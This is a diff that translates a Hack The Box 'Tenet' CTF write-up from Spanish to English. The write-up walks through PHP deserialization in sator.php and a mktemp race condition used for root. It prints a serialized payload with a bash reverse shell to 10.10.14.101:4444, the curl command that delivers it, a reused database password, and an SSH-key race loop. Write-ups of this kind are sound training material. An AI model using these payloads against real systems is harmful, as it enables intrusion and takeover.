@@ -1,6 +1,6 @@
 ---
 layout: post
-title:  "☢HTB☢ Tenet"
+title:  "[HTB] Tenet"
 date:   2021-06-12 5:35:00 +0200
 last_modified_at: 2021-06-12 5:35:00 +0200
 toc:  true
@@ -8,11 +8,11 @@ tags: [ctf, linux, hackthebox, Writeup, deserializacion]
 categories: Hackthebox
 ---
 
-{: .message }
+It is an excellent machine to practice deserialization in PHP.
 
-Es una excelente maquina para practicas la deserializacion en PHP
+---
 
-## Enumeración 
+## Enumeration 
 ### Nmap
 * 22/tcp OpenSSH 7.6p1
 * 80/tcp Apache httpd 2.4.29
@@ -39,7 +39,7 @@ Nmap done: 1 IP address (1 host up) scanned in 25.45 seconds
 ```
 
 ## Web Enumeration
-Tips rapido de enumeracion siempre ver a que nos enfrentamos:
+Quick listing tips to always see what we are up against:
 ```bash
 whatweb  10.10.10.223                                                             
 http://10.10.10.223 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.223], Title[Apache2 Ubuntu Default Page: It works]
@@ -64,7 +64,7 @@ Target: http://10.10.10.223/
 ![Pastedimage20210502200252](https://user-images.githubusercontent.com/76759292/127757805-5d1395c6-eae9-4dfd-85c1-0e482dd3f039.png)
 
 
-Subdominio:
+Subdomain:
 * sator.tenet.htb
 
 ### Tenet.htb
@@ -75,14 +75,14 @@ Subdominio:
 ## Off topic
 * /xmlrpc.php
 
-Aunque no tiene que ver me parece interesante la manera de explotacion que tiene esto [aqui]((https://www.securityfocus.com/bid/14088/exploit))
+Although it has nothing to do with it, I find it interesting the way this is exploited [aqui]((https://www.securityfocus.com/bid/14088/exploit))
 
 
 ## PHP deserialization
 
-[Lee](https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a)
+[Look](https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a)
 
-Aqui esta el otro:
+Here is the other one:
 * Sator.php.bak
 
 ```php
@@ -118,9 +118,9 @@ $app -> update_db();
 ?>
 ```
 
-Esto nos sirve para saber por donde debemos tirar, entonces viendo como se mueve todo me di cuenta de que podria ser deserializacion y me encontre con el blog que puse al principio.
+This helps us to know where we should pull, then seeing how everything moves I realized that it could be deserialization and I found the blog that I put at the beginning.
 
-Luego con la php interactive podemos crear lo que queremos que el programa nos haga:
+Then with the php interactive we can create what we want the program to do:
 
 ```php
 php -a           
@@ -135,19 +135,18 @@ php > print urlencode(serialize(new DatabaseExport));
 O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A7%3A%22rce.php%22%3Bs%3A4%3A%22data%22%3Bs%3A74%3A%22%3C%3Fphp+exec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E+%2Fdev%2Ftcp%2F10.10.14.101%2F4444+0%3E%261%27%22%29%3B+%3F%3E%22%3B%7D
 ```
 
-Para que esto funcione hacemos esto, vemos que utiliza  ```arepo```
+To make this work, we do this, we see that it uses  ```arepo```
 ```
 $input = $_GET['arepo'] ?? '';
 $databaseupdate = unserialize($input);
 ```
 
-Entonces la data serializada que generamos la colocamos aqui:
+Then the serialized data we generate is placed here:
 ```
 curl -i http://sator.tenet.htb/sator.php\?arepo\=O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A7%3A%22rce.php%22%3Bs%3A4%3A%22data%22%3Bs%3A74%3A%22%3C%3Fphp+exec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E+%2Fdev%2Ftcp%2F10.10.14.101%2F4444+0%3E%261%27%22%29%3B+%3F%3E%22%3B%7D
 ```
 
-Luego visitamos ```http://sator.tenet.htb/rce.php``` 
-
+Then we visited ```http://sator.tenet.htb/rce.php``` 
 
 ## PrivEsc
 ```bash
@@ -160,7 +159,7 @@ define( 'DB_PASSWORD', 'Opera2112' );
 
 Estas claves puedo entrar por ssh.
 
-[mktemp](https://kbmwkaaxveg73o3q7ydl7zxf2a-adv7ofecxzh2qqi-superuser-com.translate.goog/questions/834277/what-should-i-worry-about-when-using-mktemp-dry-run) vemos que podemos ejecutar un script como root lo analizo y me llama esta parte:
+[mktemp](https://kbmwkaaxveg73o3q7ydl7zxf2a-adv7ofecxzh2qqi-superuser-com.translate.goog/questions/834277/what-should-i-worry-about-when-using-mktemp-dry-run) we see that we can run a script as root I analyze it and this part calls me:
 ```bash
 addKey() {
         tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)
@@ -177,12 +176,16 @@ addKey() {
 }
 ```
 
-Si nos fijamos en la parte del mktemp -u podemos ver que el script escribe la clave publica que se encuentra en la variable key la copia en un archivo
+If we look at the part of the mktemp -u we can see that the script writes the public key found in the key variable and copies it to a file
 
 ```bash
 while true; do echo "ssh-rsa XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" | tee /tmp/ssh* > /dev/null; done
 ```
 
-Conjuntamente ejecutamos el script varias veces y listo.
+Together we run the script several times and that's it.
 
 MACHINE PWNED!!!!
+<p align="center">
+<img src="https://tenor.com/view/typing-petty-fast-cloudy-with-a-chance-of-meatballs-flint-lockwood-gif-4907824.gif" width="200" height="200" />
+</p>
+
